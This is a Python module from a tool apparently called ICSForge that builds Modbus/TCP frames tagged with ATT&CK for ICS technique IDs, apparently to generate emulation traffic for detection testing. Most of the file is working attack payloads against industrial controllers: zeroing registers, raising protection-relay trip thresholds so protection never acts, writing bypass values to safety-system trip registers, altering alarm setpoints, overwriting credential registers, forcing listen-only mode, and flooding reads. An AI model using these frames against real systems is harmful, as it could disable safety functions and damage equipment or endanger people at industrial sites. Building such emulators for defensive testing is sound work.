# ICSForge Modbus/TCP payload builder — upgraded for ATT&CK for ICS realism
import random
import struct

from .common import marker_bytes


def _mbap(tid: int, length: int) -> bytes:
    return struct.pack(">HHH", tid & 0xFFFF, 0, length & 0xFFFF)


def build_payload(marker: str, style: str = "read_holding", **kwargs) -> bytes:
    """
    Modbus/TCP ADU (MBAP + PDU + marker).

    Styles:
      read_holding, read_coils, read_discrete, read_input
      write_single_coil, write_single_register
      write_multiple_coils, write_multiple_registers
      read_write_multiple  (FC23 - simultaneous read+write, T0832)
      mask_write_register  (FC22 - bit-level, T0836)
      diagnostic           (FC08 - echo test, T0820)
      read_exception_status(FC07 - T0882)
      get_comm_event_counter(FC11 - T0882)
      safety_write         (FC16 to safety register range, T0829/T0876)
      brute_force_write    (FC16 sequential addresses, T0806)
      coil_sweep           (FC01 address sweep, T0841)
      dos_read             (FC03 max qty, T0814)
      exception_probe      (FC03 illegal addr, T0820)
    """
    rnd  = random.Random(kwargs.get("seed"))
    tid  = int(kwargs.get("transaction_id", rnd.randint(0, 0xFFFF)))
    unit = int(kwargs.get("unit_id", rnd.randint(1, 247))) & 0xFF
    mb   = marker_bytes(marker)

    if style == "read_holding":
        addr = int(kwargs.get("address", rnd.randint(0, 9999))) & 0xFFFF
        qty  = int(kwargs.get("quantity", rnd.randint(1, 10)))  & 0xFFFF
        pdu  = bytes([unit, 0x03]) + struct.pack(">HH", addr, qty)

    elif style == "read_coils":
        addr = int(kwargs.get("address", rnd.randint(0, 9999))) & 0xFFFF
        qty  = int(kwargs.get("quantity", rnd.randint(1, 16)))  & 0xFFFF
        pdu  = bytes([unit, 0x01]) + struct.pack(">HH", addr, qty)

    elif style == "read_discrete":
        addr = int(kwargs.get("address", rnd.randint(0, 9999))) & 0xFFFF
        qty  = int(kwargs.get("quantity", rnd.randint(1, 16)))  & 0xFFFF
        pdu  = bytes([unit, 0x02]) + struct.pack(">HH", addr, qty)

    elif style == "read_input":
        addr = int(kwargs.get("address", rnd.randint(30001, 39999))) & 0xFFFF
        qty  = int(kwargs.get("quantity", rnd.randint(1, 10)))        & 0xFFFF
        pdu  = bytes([unit, 0x04]) + struct.pack(">HH", addr, qty)

    elif style == "write_single_coil":
        addr  = int(kwargs.get("address", rnd.randint(0, 9999))) & 0xFFFF
        value = 0xFF00
        pdu   = bytes([unit, 0x05]) + struct.pack(">HH", addr, value)

    elif style == "write_single_register":
        addr  = int(kwargs.get("address", rnd.randint(40001, 49999))) & 0xFFFF
        value = int(kwargs.get("value",   rnd.randint(0, 0xFFFF)))    & 0xFFFF
        pdu   = bytes([unit, 0x06]) + struct.pack(">HH", addr, value)

    elif style == "write_multiple_coils":
        addr   = int(kwargs.get("address", rnd.randint(0, 9999))) & 0xFFFF
        qty    = int(kwargs.get("quantity", rnd.randint(8, 32)))  & 0xFFFF
        nbytes = (qty + 7) // 8
        data   = bytes([0xAA] * nbytes)
        pdu    = bytes([unit, 0x0F]) + struct.pack(">HHB", addr, qty, nbytes) + data

    elif style == "write_multiple_registers":
        addr = int(kwargs.get("address",  rnd.randint(40001, 49999))) & 0xFFFF
        qty  = int(kwargs.get("quantity", rnd.randint(2, 8)))          & 0xFFFF
        data = b"".join(struct.pack(">H", rnd.randint(0, 0xFFFF)) for _ in range(qty))
        pdu  = bytes([unit, 0x10]) + struct.pack(">HHB", addr, qty, qty * 2) + data

    elif style == "read_write_multiple":
        # FC23: read + write in one request — T0832 Manipulation of View
        r_addr = int(kwargs.get("read_address",   rnd.randint(0, 9999)))      & 0xFFFF
        r_qty  = int(kwargs.get("read_quantity",  rnd.randint(1, 5)))          & 0xFFFF
        w_addr = int(kwargs.get("write_address",  rnd.randint(40001, 49999))) & 0xFFFF
        w_qty  = int(kwargs.get("write_quantity", rnd.randint(1, 3)))          & 0xFFFF
        w_data = b"".join(struct.pack(">H", rnd.randint(0, 0xFFFF)) for _ in range(w_qty))
        pdu    = bytes([unit, 0x17]) + struct.pack(">HHHHB", r_addr, r_qty, w_addr, w_qty, w_qty*2) + w_data

    elif style == "mask_write_register":
        # FC22: bit-level AND+OR mask — T0836 Modify Parameter
        addr     = int(kwargs.get("address",  rnd.randint(40001, 49999))) & 0xFFFF
        and_mask = int(kwargs.get("and_mask", 0xFF00)) & 0xFFFF
        or_mask  = int(kwargs.get("or_mask",  0x00FF)) & 0xFFFF
        pdu      = bytes([unit, 0x16]) + struct.pack(">HHH", addr, and_mask, or_mask)

    elif style == "diagnostic":
        # FC08 subfn 0x00 Return Query Data — T0820 fingerprinting probe
        subfn = int(kwargs.get("subfn", 0x0000)) & 0xFFFF
        echo  = struct.pack(">H", rnd.randint(0, 0xFFFF))
        pdu   = bytes([unit, 0x08]) + struct.pack(">H", subfn) + echo

    elif style == "read_exception_status":
        # FC07 — T0882 Theft of Operational Information
        pdu = bytes([unit, 0x07])

    elif style == "get_comm_event_counter":
        # FC11 — T0882 Theft of Operational Information
        pdu = bytes([unit, 0x0B])

    elif style == "safety_write":
        # FC16 to high-register safety zone (60000+) — T0829/T0876
        addr = int(kwargs.get("address", rnd.randint(60000, 65000))) & 0xFFFF
        qty  = int(kwargs.get("quantity", rnd.randint(2, 6)))         & 0xFFFF
        data = bytes([0x00]) * (qty * 2)  # zero-out pattern (trip)
        pdu  = bytes([unit, 0x10]) + struct.pack(">HHB", addr, qty, qty*2) + data

    elif style == "brute_force_write":
        # FC16 to rapidly incrementing addresses — T0806 Brute Force I/O
        base = int(kwargs.get("base_address", rnd.randint(0, 100))) & 0xFFFF
        addr = (base + rnd.randint(0, 200)) & 0xFFFF
        qty  = int(kwargs.get("quantity", rnd.randint(4, 16)))        & 0xFFFF
        data = b"".join(struct.pack(">H", rnd.randint(0, 0xFFFF)) for _ in range(qty))
        pdu  = bytes([unit, 0x10]) + struct.pack(">HHB", addr, qty, qty*2) + data

    elif style == "coil_sweep":
        # FC01 address sweep — T0841 Network Service Scanning
        base = int(kwargs.get("base_address", 0)) & 0xFFFF
        addr = (base + rnd.randint(0, 500)) & 0xFFFF
        qty  = int(kwargs.get("quantity", rnd.randint(1, 8))) & 0xFFFF
        pdu  = bytes([unit, 0x01]) + struct.pack(">HH", addr, qty)

    elif style == "dos_read":
        # FC03 max quantity (125 regs = 250 bytes) — T0814 DoS
        addr = int(kwargs.get("address", 0))    & 0xFFFF
        qty  = int(kwargs.get("quantity", 125)) & 0xFFFF
        pdu  = bytes([unit, 0x03]) + struct.pack(">HH", addr, qty)

    elif style == "exception_probe":
        # FC03 illegal address — triggers exception 0x02, fingerprints PLC — T0820
        addr = int(kwargs.get("address", 0xFFFF)) & 0xFFFF
        pdu  = bytes([unit, 0x03]) + struct.pack(">HH", addr, 1)

    elif style == "zero_all":
        # FC16 write zeros to full holding register range — T0809 Data Destruction
        addr = int(kwargs.get("address", rnd.randint(40001, 40100))) & 0xFFFF
        qty  = int(kwargs.get("quantity", rnd.randint(60, 125))) & 0xFFFF
        data = b"\x00" * (qty * 2)
        pdu  = bytes([unit, 0x10]) + struct.pack(">HHB", addr, qty, qty * 2) + data

    elif style == "input_write":
        # FC16 targeting input register address space (30001-39999) — T0835 Manipulate I/O Image
        # Not normally writable — attacker tries to poison PLC input image via gateway
        addr = int(kwargs.get("address", rnd.randint(0, 9999))) & 0xFFFF  # raw 0-based discrete input addr
        qty  = int(kwargs.get("quantity", rnd.randint(1, 8))) & 0xFFFF
        data = b"".join(struct.pack(">H", rnd.randint(0, 0xFFFF)) for _ in range(qty))
        pdu  = bytes([unit, 0x10]) + struct.pack(">HHB", addr, qty, qty * 2) + data

    elif style == "protection_relay":
        # FC16 to protection relay parameter range (high holding registers) — T0837 Loss of Protection
        # Protection functions: overcurrent/overvoltage pickup at registers 50000+
        addr = int(kwargs.get("address", rnd.randint(50000, 59999))) & 0xFFFF
        qty  = int(kwargs.get("quantity", rnd.randint(2, 6))) & 0xFFFF
        # Write max values to raise trip threshold so protection never activates
        data = b"\xFF\xFF" * qty
        pdu  = bytes([unit, 0x10]) + struct.pack(">HHB", addr, qty, qty * 2) + data

    elif style == "alarm_threshold":
        # FC16 to alarm setpoint registers (typically 45000-49999 range) — T0838 Modify Alarm Settings
        addr = int(kwargs.get("address", rnd.randint(45000, 49999))) & 0xFFFF
        qty  = int(kwargs.get("quantity", rnd.randint(2, 4))) & 0xFFFF
        # Write extremes: high-high alarm limit raised to max, low-low lowered to zero
        data = b"\xFF\xFF" * qty
        pdu  = bytes([unit, 0x10]) + struct.pack(">HHB", addr, qty, qty * 2) + data

    elif style == "channel_flood":
        # Rapid FC03 burst to the same port — T0803 Block Command Message (channel saturation)
        # Also used for T0826 Loss of Availability
        addr = int(kwargs.get("address", 0)) & 0xFFFF
        qty  = int(kwargs.get("quantity", rnd.randint(100, 125))) & 0xFFFF
        pdu  = bytes([unit, 0x03]) + struct.pack(">HH", addr, qty)

    elif style == "c2_beacon":
        # FC06 write to single register with encoded value — T0869 Standard App Layer Protocol (C2)
        # Uses legitimate Modbus port/protocol as covert C2 channel
        # Also covers T0885 Commonly Used Port
        addr  = int(kwargs.get("address", rnd.randint(40001, 40010))) & 0xFFFF
        # Encode beacon sequence number in the register value
        value = int(kwargs.get("value", rnd.randint(0xA000, 0xAFFF))) & 0xFFFF
        pdu   = bytes([unit, 0x06]) + struct.pack(">HH", addr, value)

    elif style == "credential_write":
        # FC16 to known credential/access-control register range — T0892 Change Credential
        # Modbus PLCs that store PIN/password in holding registers (Schneider M340, etc.)
        addr = int(kwargs.get("address", rnd.randint(49000, 49050))) & 0xFFFF
        qty  = int(kwargs.get("quantity", 4)) & 0xFFFF
        # New credential pattern (all 0xFF = disable all access)
        data = b"\xFF\xFF" * qty
        pdu  = bytes([unit, 0x10]) + struct.pack(">HHB", addr, qty, qty * 2) + data

    elif style == "io_image_read":
        # FC01+FC02+FC03+FC04 sequence reading full I/O image — T0877 I/O Image
        # Approximated as FC03 read of both coil and register areas in one frame
        addr = int(kwargs.get("address", 0)) & 0xFFFF
        qty  = int(kwargs.get("quantity", 125)) & 0xFFFF
        pdu  = bytes([unit, 0x03]) + struct.pack(">HH", addr, qty)

    elif style == "sis_disable":
        # FC16 writing bypass/inhibit values to SIS trip registers — T0880 Loss of Safety
        # Distinct from safety_write (T0829): this targets inhibit/bypass bits
        addr = int(kwargs.get("address", rnd.randint(61000, 65000))) & 0xFFFF
        qty  = int(kwargs.get("quantity", rnd.randint(2, 8))) & 0xFFFF
        # 0xBEEF = common inhibit pattern in SIS registers
        data = b"\xBE\xEF" * qty
        pdu  = bytes([unit, 0x10]) + struct.pack(">HHB", addr, qty, qty * 2) + data

    elif style == "default_creds_probe":
        # FC43 (Read Device Identification) — T0812 Default Credentials probe
        # Reads device ID; in context this is credential validation via protocol native function
        pdu = bytes([unit, 0x2B, 0x0E, 0x01, 0x00])

    elif style == "report_block":
        # FC08 subfunction 4 (Force Listen Only Mode) — T0804 Block Reporting Message
        # Puts device in listen-only, blocking outbound reports to SCADA
        subfn = 0x0004
        pdu   = bytes([unit, 0x08]) + struct.pack(">H", subfn) + b"\x00\x00"

    else:
        # fallback
        addr = rnd.randint(0, 9999) & 0xFFFF
        qty  = rnd.randint(1, 10)   & 0xFFFF
        pdu  = bytes([unit, 0x03]) + struct.pack(">HH", addr, qty)

    pdu_full = pdu + mb
    return _mbap(tid, len(pdu_full)) + pdu_full
